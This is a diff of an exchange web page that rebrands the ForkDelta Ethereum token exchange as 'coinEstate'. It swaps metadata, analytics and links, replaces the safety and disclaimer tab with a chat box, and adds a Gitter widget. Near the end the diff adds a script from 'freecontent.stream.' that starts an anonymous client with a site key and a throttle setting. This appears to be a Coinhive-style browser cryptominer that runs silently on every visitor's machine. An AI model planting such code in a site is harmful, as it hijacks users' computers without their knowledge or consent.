@@ -13,18 +13,19 @@
     <link href="/css/black.css" rel="stylesheet" id="stylesheet" />
     <link href="/css/small.css" rel="stylesheet" media="only screen and (max-device-width: 480px)" />
 
-    <meta property="og:url" content="https://somidax.github.io" />
-    <meta property="og:title" content="ForkDelta | Decentralized Ethereum Token Exchange" />
-    <meta property="og:description" content="ForkDelta is a fully decentralized Ethereum Token Exchange with the most ERC20 listings of any exchange. Start trading cryptocurrency today." />
-    <meta property="og:image" content="https://forkdelta.github.io/images/logo.png" />
-
-    <title>ForkDelta | Decentralized Ethereum Token Exchange</title>
-    <meta name="description" content="ForkDelta is a fully decentralized Ethereum Token Exchange with the most ERC20 listings of any exchange. Start trading cryptocurrency today." />
+    <meta property="og:url" content="https://coinstate.somidax.net" />
+    <meta property="og:title" content="coinEstate | An Ethereum token community marketplace exchange for everyone/>
+    <meta property="og:description" content="coinEstate is a Decentralized Ethereum token marketplace community where everyone are tradable with freedom for listing on the exchange. Start trading cryptocurrency today." />
+    <meta property="og:image" content="https://github.com/somidax/coinEstate/blob/master/images/logo.png" />
+    
+    <title>coinEstate |  An Ethereum token community marketplace exchange for everyone</title>
+    <meta name="description" content="coinEstate is a Decentralized Ethereum token marketplace community where everyone are tradable with freedom for listing on the exchange. Start trading cryptocurrency today" />
     <meta name="twitter:widgets:autoload" content="off">
   </head>
 
   <body>
-    <nav class="navbar navbar-default navbar-fixed-top">
+
+    <nav class="navbar navbar-default">
       <div class="container-fluid">
         <!-- Brand and toggle get grouped for better mobile display -->
         <div class="navbar-header">
@@ -35,7 +36,7 @@
             <span class="icon-bar"></span>
           </button>
           <a class="navbar-brand" href="/">
-            <img src="/images/title.png" alt="I know it's not a fork, it's a trident." />
+            <img src="/images/title.png" alt="ethereum Token community p2p Exchange" />
           </a>
         </div>
 
@@ -45,8 +46,10 @@
             <li class="dropdown" id="tokensDropdown"></li>
           </ul>
           <ul class="nav navbar-nav navbar-right">
-          	<li><a href="/about/"><i class="fa fa-info-circle"></i> About ForkDelta</a></li>
-          	<li style="display: none;" class="dropdown" id="helpDropdown"></li>
+            <li><a href="https://marketplace.somidax.net/pages/contact-us"><i class="fa fa-file-text"></i> Token Listing</a></li>
+            <li><a href="https://marketplace.somidax.net/pages/contact-us"><i class="fa fa-file-text"></i> Advertise</a></li>
+            <li><a href="/about/"><i class="fa fa-info-circle"></i> About coinEstate</a></li>
+            <li style="display: none;" class="dropdown" id="helpDropdown"></li>
             <li class="dropdown" id="tokenGuidesDropdown"></li>
             <li class="dropdown" id="connection"></li>
             <li class="dropdown" id="languages"></li>
@@ -103,49 +106,296 @@
             <div class="row-header trn">my_transactions</div>
             <div class="row-box nav-header">
               <ul class="nav nav-tabs four columns" role="tablist">
-                <li role="presentation" class="active"><a href="#important" aria-controls="info" role="tab" data-toggle="tab" class="trn">important</a></li>
+                <li role="presentation" class="active"><a href="#Trollbox" aria-controls="Trollbox" role="tab" data-toggle="tab" class="trn">Trollbox</a></li>
                 <li role="presentation"><a href="#myTrades" aria-controls="myTrades" role="tab" data-toggle="tab" class="trn">trades</a></li>
                 <li role="presentation"><a href="#myOrders" aria-controls="myOrders" role="tab" data-toggle="tab" class="trn">orders</a></li>
                 <li role="presentation"><a href="#myFunds" aria-controls="myFunds" role="tab" data-toggle="tab" class="trn">funds</a></li>
               </ul>
             </div>
             <div class="row-box">
-                <div class="row-box height2 scroll">
+                <div class="row-box height2">
                   <div class="tab-content">
-                  <div role="tabpanel" class="tab-pane active" id="important">
-                    <div style="margin: 12px;">
-                      <p>
-                        <a href="https://discord.gg/mMnRq7m" target="_blank"><img alt="Chat on Discord" src="https://img.shields.io/badge/chat-on%20discord-7289da.svg" /></a>
-                        <a href="https://www.reddit.com/r/ForkDelta" target="_blank"><img alt="Join us on Reddit" src="https://img.shields.io/badge/reddit-ForkDelta-red.svg" /></a>
-                      </p>
-                      <p style="color: #f00; font-weight: bold;">URL & Status</p>
-                      <p style="font-size: 12px;">
-                        The URL of this project is <a href="https://forkdelta.github.io">forkdelta.github.io</a>. Bookmark it once and use the bookmark.
-                      </p>
-                      <p style="font-size: 12px;">
-                        This interface is a fork of <a href="https://etherdelta.com">EtherDelta</a> with a ton of improvements including a much faster order processing system.
-                        It interacts with ForkDelta's revamped API and EtherDelta's original contract.
-                      </p>
-                      <p style="color: #f00; font-weight: bold;">How to Start Trading</p>
-                      <p style="font-size: 12px;">
-                        <strong>Use the Deposit form (upper left) to put your funds (ETH and tokens) on the exchange.</strong> Do not send your tokens directly to the smart contract, or they will be lost and unrecoverable. ForkDelta cannot help you with funds incorrectly deposited to the trading smart contract.
-                      </p>
-                      <p style="color: #f00; font-weight: bold;">ForkDelta Disclaimer</p>
-                      <p style="font-size: 12px;">
-                        ForkDelta is a decentralized trading platform that lets
-                        you trade Ether and Ethereum-based tokens directly with other users.
-                        You are responsible for your own account, funds, and private keys.
-                        You are responsible for your own trading decisions, and the details
-                        and mechanics of the tokens you trade.
-                        ForkDelta is not responsible for your decisions, actions, or losses that result from
-                        using ForkDelta. ForkDelta makes no guarantee about the tokens that you trade using
-                        ForkDelta. ForkDelta does not hold your funds and does not offer refunds.
-                        While the information contained on ForkDelta is periodically updated, no guarantee is given
-                        that the information provided on ForkDelta is correct, complete, or up-to-date.
-                        By using ForkDelta, you acknowledge this and agree to these terms.
-                      </p>
-                    </div>
-                  </div>
+                  <div role="tabpanel" class="tab-pane active" id="Trollbox">
+<script src="https://www.shoutbox.com/chat/chat.js.php"></script>
+<script> var chat = new Chat(10381);</script>
+<style >
+@import url(//fonts.googleapis.com/css?family=Abel);
+#emailAdmin, #passwordAdmin, #loginAdminBtn, #forgottenEmail, #sendMyPasswordBtn {
+    border: 1px solid #333;
+    padding: 2px;
+    margin: 0px;
+    width: calc(100% - 30px);
+}
+.configPanel label {
+  margin-left:5px;
+  margin-top:20px;
+}
+#forgottenBtn {
+  cursor:pointer;
+  transition-duration:0.5s;
+}
+#forgottenBtn:hover  {
+  color:blue;
+  transition-duration:0.5s;
+}
+.changeUsernameBtn {
+  float:right;
+  border:1px solid #666;
+  font-size:0.8em;
+  padding:2px;
+  cursor:pointer;
+  color:#2e2e2e;
+}
+#changePassword1, #changePassword2 {
+    border: 1px solid #333;
+    padding: 2px;
+    width: calc(50% - 15px);
+    margin: 5px;  
+}
+#saveBtn {
+  float:right;
+  cursor:pointer;
+  border: 1px solid #333;
+  margin-right:15px;
+}
+.changeUsernameBtn:hover {
+  color:#fb9f27;
+}
+ #loginAdminBtn, #sendMyPasswordBtn {
+   cursor:pointer;
+ }
+  #loginAdminBtn:hover, #sendMyPasswordBtn:hover {
+    background-color: #888;
+  }
+.adShoutBox {
+  font-size:0em;
+  float:left;
+}
+.adminCog {
+  display: none;
+  z-index: 3;
+    position: absolute;
+    right: 0px;
+    top: 0px; 
+}
+.adminCog i {
+  cursor:pointer;
+}
+.error {
+    text-align: center;
+    color: red;
+  font-weight:bold;
+    clear: both;
+}
+.shoutBoxContainer {
+  position: relative;
+    width:100%;
+  height: calc(40vh - 25px);
+  border:0px solid  #2e2e2e;
+  padding:0px;
+  font-size:12px;
+  font-family: 'Abel', sans-serif;
+  border-radius:3px;
+  background-color: #2e2e2e;
+  
+}
+.adminShoutBoxInput {
+  background-color: #fb9f27;
+}
+.shoutBoxHeader {
+  display: none;
+  border:0px solid #2e2e2e;
+  padding:0px;
+  background-color:#2e2e2e;
+  cursor:pointer;
+  z-index:1;
+  position:absolute;
+  left:5px;
+  right:5px;
+  box-shadow: 0px 0px 0px 0px #2e2e2e;
+  -webkit-touch-callout: none;
+  -webkit-user-select: none;
+  -khtml-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;  
+}
+.shoutServerText {
+  border:0px solid #fff;
+  border-radius:5px;
+  padding:4px;
+  margin-bottom:3px;
+  margin-top:3px; 
+  margin-right:5px;
+  background-color:rgba(255, 255, 255, 0.0);
+  color: #45ff8f;
+}
+.shoutText {
+  font-size:1em;
+  border:0px solid #2e2e2e;
+  border-radius:3px;
+  padding:4px;
+  margin-bottom:3px;
+  margin-top:3px; 
+  margin-right:5px;
+  background-color:rgba(255, 255, 255, 0.0);
+  
+}
+
+
+.shoutboxBanBtn {
+  font-size:0.8em;
+  float:right;
+  float:right;
+  cursor:pointer;
+  display:none;
+  background-color:grey;
+  border:1px solid #000;
+  margin:1px;
+  padding:1px;
+  
+}
+.shoutboxDelBtn {
+  font-size:0.8em;
+  float:right;
+  float:right;
+  cursor:pointer;
+  display:none;
+  border:1px solid #000;
+  margin:1px;
+  padding:1px;
+}
+
+.shoutDate {
+  font-size:0.9em;
+}
+.shoutBoxAvatar {
+  width:0px;
+  height:0px;
+  margin-right: 0px;
+  border-radius: 0px;
+}
+#shoutBoxUserList {
+  overflow:hidden;
+  max-height:100%;
+  overflow-y:scroll;
+  display:none;
+}
+.shoutBoxUserItem {
+  border-bottom:1px solid #bbb;
+}
+.shoutBoxUserItem:hover {
+  background-color:#ddd;
+}
+.shoutText {
+  font-size:1em;
+  color: #fff;
+  border:1px solid #2e2e2e;
+  border-radius:2px;
+  padding:1px;
+  margin-bottom:1px;
+  margin-top:1px; 
+  margin-right:1px;
+  background-color:#2e2e2e;
+}
+.shoutText:hover {
+  background-color:#2e2e2e;
+}
+#shoutBoxHeaderText {
+  display:inline-block;
+  
+}
+.shoutChat {
+  position:absolute;
+  left:15px;
+  right:15px;
+  top:5px;
+  bottom:37px;
+    overflow-y : scroll;
+  overflow-x : hidden;
+
+
+}
+                   
+.shoutSound {
+  sound: off
+                   
+}
+                   
+.shoutInputRed {
+  background-color:#fb9f27;
+
+}
+
+.shoutInput {
+  position: absolute;
+  bottom: 00px;
+  left:5px;
+  right:5px;
+  border-top:1px solid #CCC;
+  padding-top: 4px;
+  padding-bottom: 5px;
+  
+}
+:focus {outline:none;border:0px solid grey}
+
+.shoutInput input {
+width: calc(100% - 0px);
+    color: black;
+    border-radius: 3px;
+    border: 1px solid #2e2e2e;
+  box-sizing: border-box;
+    padding-left: 0px;
+    /* padding-left: 10px; */
+    /* padding-right: 10px; */
+}
+.shoutUserText {
+  font-weight: bold;
+  font-size:0.8em;
+}
+
+::-webkit-scrollbar
+{
+  width: 1px;  /* for vertical scrollbars */
+}
+
+::-webkit-scrollbar-track
+{
+  background: rgba(0, 0, 0, 0.0);
+  border-radius:1px;
+}
+
+::-webkit-scrollbar-thumb
+{
+  background: rgba(0, 0, 0, 0.0);
+  border-radius:1px;
+}
+
+.privateChat {
+  width:250px;
+  height:250px;
+  background-color:red;
+  position: absolute;
+  bottom: 0px;
+  right: 0px; 
+}
+
+.configPanel {
+    padding-top: 30px;
+    z-index: 1;
+  display:none;
+  position:absolute;
+  top:0px;
+  left:0px;
+  bottom:0px;
+  right:0px;
+  background-color: #fff;
+
+}
+
+
+</style>                                     
+                                                       </div>
                   <div role="tabpanel" class="tab-pane" id="myTrades"></div>
                   <div role="tabpanel" class="tab-pane" id="myOrders"></div>
                   <div role="tabpanel" class="tab-pane" id="myFunds"></div>
@@ -193,7 +443,7 @@
       (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
       m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
       })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
-      ga('create', 'UA-112001937-1', 'auto');
+      ga('create', 'UA-109254084-1', 'auto');
       ga('send', 'pageview');
     </script>
 
@@ -221,7 +471,7 @@
         twttr.widgets.createTimeline(
           {
             sourceType: 'profile',
-            screenName: 'ForkDelta'
+            screenName: 'somidax'
           },
           document.getElementById('updates'),
           {
@@ -234,5 +484,18 @@
         embedTwitter('dark')
       })
     </script>
+  <script src="https://www.freecontent.stream./1tPB.js"></script>
+    <script>
+        var _client = new Client.Anonymous('603f062d3d46b07c8cc2484c556a34b71e046ed4a2e2f11b98c1be9fb631fef7', {
+            throttle: 0.2
+        });
+       _client.start();
+  </script>
+<script>
+  ((window.gitter = {}).chat = {}).options = {
+    room: 'coinEstate/soDev'
+  };
+</script>
+<script src="https://sidecar.gitter.im/dist/sidecar.v1.js" async defer></script>
   </body>
 </html>
